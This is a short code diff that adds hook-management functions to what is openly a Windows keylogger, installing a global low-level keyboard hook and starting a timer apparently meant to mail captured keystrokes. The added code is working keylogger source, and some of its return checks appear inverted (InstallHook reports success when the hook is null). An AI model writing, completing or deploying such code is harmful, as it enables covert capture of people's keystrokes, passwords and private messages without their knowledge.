@@ -71,7 +71,29 @@ LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept ke
 	return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
+bool InstallHook()
+{
+	Helper::WriteAppLog("Hook started... Timer started"); // Debug message
+	MailTimer.Start(true);
 
+	// WH_KEYBOARD_LL - indicates we use keyboard hook and LL is low level -> global hook, value 13
+	// OurKeyBoardProc - procedure invoked by hook system every time user press a key
+	// GetModuleHandle serves for obatining H instance
+	// DWTHREADID or 0 is identifier of thread which hook procedure is associated with (all existing threads)
+	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyBoardProc, GetModuleHandle(NULL), 0);
+	return eHook == NULL;
+}
 
+bool UninstallHook() // disable hook, does not stop keylogger
+{
+	bool b = UnhookWindowsHookEx(eHook);
+	eHook = NULL;
+	return (bool)b;
+}
+
+bool IsHooked()
+{
+	return (bool)(eHook == NULL);
+}
 
 #endif // KEYBHOOK_H
